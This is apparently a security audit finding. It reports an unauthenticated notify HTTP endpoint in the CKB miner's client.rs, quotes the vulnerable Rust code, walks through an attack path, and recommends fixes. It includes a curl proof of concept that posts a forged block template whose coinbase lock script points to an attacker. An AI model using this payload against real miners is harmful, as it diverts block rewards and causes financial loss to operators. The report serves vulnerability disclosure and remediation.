### Title
Unauthenticated Miner Notify HTTP Endpoint Allows Any Attacker to Inject Fake Block Templates - (File: `miner/src/client.rs`)

---

### Summary

When the CKB miner is configured in "notify mode" (`config.listen` is set), it binds a TCP HTTP server that accepts `BlockTemplate` push notifications. The HTTP handler performs **no authentication, no source IP check, and no token validation**. Any attacker who can reach the miner's listen port can POST a crafted `BlockTemplate` with an attacker-controlled coinbase lock script, causing the miner to mine blocks that pay all block rewards to the attacker.

---

### Finding Description

**Root Cause**

`miner/src/client.rs` contains two relevant functions:

1. `listen_block_template_notify` (lines 234–271) binds a `TcpListener` to the configured address and accepts connections from any source. The peer address is silently discarded at line 245:

```rust
let (stream, _) = match conn {   // peer addr thrown away, no IP check
    Ok(conn) => conn,
    ...
};
``` [1](#0-0) 

2. The `handle` function (lines 358–369) processes every incoming HTTP request. It deserializes the body as a `BlockTemplate` and immediately calls `client.update_block_template(template)` with **zero authentication**:

```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();
    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);   // no auth, no source check
    }
    Ok(Response::new(Empty::new()))
}
``` [2](#0-1) 

3. `update_block_template` (lines 293–312) accepts any template whose `work_id` differs from the current one (or is zero), then sends it as new work to the mining workers:

```rust
fn update_block_template(&self, block_template: BlockTemplate) {
    let work_id = block_template.work_id.into();
    let updated = |id| {
        if id != work_id || id == 0 { Some(work_id) } else { None }
    };
    if self.current_work_id.fetch_update(..., updated).is_ok() {
        let work: Work = block_template.into();
        self.new_work_tx.send(Works::New(work)) ...
    }
}
``` [3](#0-2) 

**Attack Path**

1. Attacker discovers the miner's notify listen address (e.g., `192.168.1.100:8115`).
2. Attacker crafts a `BlockTemplate` JSON body identical in structure to a legitimate one, but with the `lock` field of the coinbase output replaced by the attacker's own lock script.
3. Attacker sends a single HTTP POST to the miner's listen port.
4. `handle` deserializes the body and calls `update_block_template` — no check is performed.
5. The miner's workers receive the new work and begin solving PoW for the attacker's template.
6. Upon solving, the miner calls `submit_block` on the CKB node. The node performs full block verification (PoW, header, transactions) and accepts the block — because the block itself is structurally valid.
7. The block reward is paid to the attacker's address.

The `submit_block` RPC in `rpc/src/module/miner.rs` (lines 260–298) does verify PoW and block structure, but it cannot detect that the coinbase was injected by an attacker — it only checks consensus validity. [4](#0-3) 

---

### Impact Explanation

An attacker who can reach the miner's notify HTTP port can **permanently redirect all mining rewards** to their own address for as long as the attack persists. The miner operator loses 100% of block rewards during the attack window. Because the submitted block is consensus-valid, the CKB node and the rest of the network accept it normally — there is no on-chain indication of the attack. The impact is **direct, irreversible financial loss** to the miner operator.

---

### Likelihood Explanation

- The `listen` address is operator-configured. If bound to `0.0.0.0` (common in cloud/datacenter deployments where the CKB node and miner run on separate machines), the port is reachable from the network.
- The attack requires only a single HTTP POST with a crafted JSON body — no keys, no special privileges, no prior state.
- The miner's log message at line 208–219 explicitly instructs operators to configure `notify = ["http://ADDR"]` in the CKB node's block assembler, implying the listen address is intentionally network-accessible in many deployments. [5](#0-4) 

---

### Recommendation

1. **Source IP allowlist**: In `listen_block_template_notify`, capture the peer address from `listener.accept()` and reject connections that do not originate from the configured CKB node's IP.
2. **Shared secret token**: Add a configurable `notify_token` to `MinerClientConfig`. The CKB node includes it as an HTTP header; the `handle` function rejects requests missing or presenting the wrong token.
3. **Bind to localhost by default**: Change the default `listen` address to `127.0.0.1` so the endpoint is not network-accessible unless explicitly configured otherwise.

---

### Proof of Concept

```bash
# Attacker crafts a BlockTemplate with their own coinbase lock script
# and POSTs it to the miner's notify endpoint

curl -X POST http://<MINER_LISTEN_ADDR> \
  -H "Content-Type: application/json" \
  -d '{
    "version": "0x0",
    "compact_target": "0x1e083126",
    "current_time": "0x...",
    "number": "0x401",
    "epoch": "0x...",
    "parent_hash": "0x<current_tip_hash>",
    "cycles_limit": "0x...",
    "bytes_limit": "0x...",
    "uncles_count_limit": "0x2",
    "uncles": [],
    "transactions": [],
    "proposals": [],
    "cellbase": {
      "hash": "0x...",
      "cycles": null,
      "data": {
        "version": "0x0",
        "cell_deps": [],
        "header_deps": [],
        "inputs": [{"previous_output": {"tx_hash": "0x000...000", "index": "0xffffffff"}, "since": "0x401"}],
        "outputs": [{"capacity": "0x<reward>", "lock": {"code_hash": "0x<ATTACKER_CODE_HASH>", "hash_type": "type", "args": "0x<ATTACKER_ARGS>"}, "type": null}],
        "outputs_data": ["0x"],
        "witnesses": ["0x..."]
      }
    },
    "work_id": "0x<different_from_current>",
    "dao": "0x...",
    "min_fee_rate": "0x3e8",
    "extension": null
  }'
```

The miner's `handle` function accepts this without any check. The miner begins mining the attacker's template. Upon solving PoW, it submits the block via `submit_block`, which the CKB node accepts as a valid block. The block reward is paid to the attacker's lock script.

### Citations

**File:** miner/src/client.rs (L207-220)
```rust
            ckb_logger::info!("listen notify mode : {}", addr);
            ckb_logger::info!(
                r#"
Please note that ckb-miner runs in notify mode. \
You should configure the corresponding information in CKB block assembler, \
for example:

[block_assembler]
...
notify = ["http://{}"]

Otherwise ckb-miner will malfunction and stop submitting valid blocks after a certain period.
"#,
                addr
```

**File:** miner/src/client.rs (L244-246)
```rust
                conn = listener.accept() => {
                    let (stream, _) = match conn {
                        Ok(conn) => conn,
```

**File:** miner/src/client.rs (L293-312)
```rust
    fn update_block_template(&self, block_template: BlockTemplate) {
        let work_id = block_template.work_id.into();
        let updated = |id| {
            if id != work_id || id == 0 {
                Some(work_id)
            } else {
                None
            }
        };
        if self
            .current_work_id
            .fetch_update(Ordering::SeqCst, Ordering::SeqCst, updated)
            .is_ok()
        {
            let work: Work = block_template.into();
            if let Err(e) = self.new_work_tx.send(Works::New(work)) {
                error!("notify_new_block error: {:?}", e);
            }
        }
    }
```

**File:** miner/src/client.rs (L358-369)
```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();

    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }

    Ok(Response::new(Empty::new()))
}
```

**File:** rpc/src/module/miner.rs (L260-298)
```rust
    fn submit_block(&self, work_id: String, block: Block) -> Result<H256> {
        let block: packed::Block = block.into();
        let block: Arc<core::BlockView> = Arc::new(block.into_view());
        let header = block.header();
        debug!(
            "start to submit block, work_id = {}, block = #{}({})",
            work_id,
            block.number(),
            block.hash()
        );

        let snapshot: &Snapshot = &self.shared.snapshot();
        let consensus = snapshot.consensus();

        // Verify header
        HeaderVerifier::new(snapshot, consensus)
            .verify(&header)
            .map_err(|err| handle_submit_error(&work_id, &err))?;
        if self
            .shared
            .snapshot()
            .get_block_header(&block.parent_hash())
            .is_none()
        {
            let err = format!(
                "Block parent {} of {}-{} not found",
                block.parent_hash(),
                block.number(),
                block.hash()
            );

            return Err(handle_submit_error(&work_id, &err));
        }

        // Verify and insert block
        let is_new = self
            .chain
            .blocking_process_block(Arc::clone(&block))
            .map_err(|err| handle_submit_error(&work_id, &err))?;
```
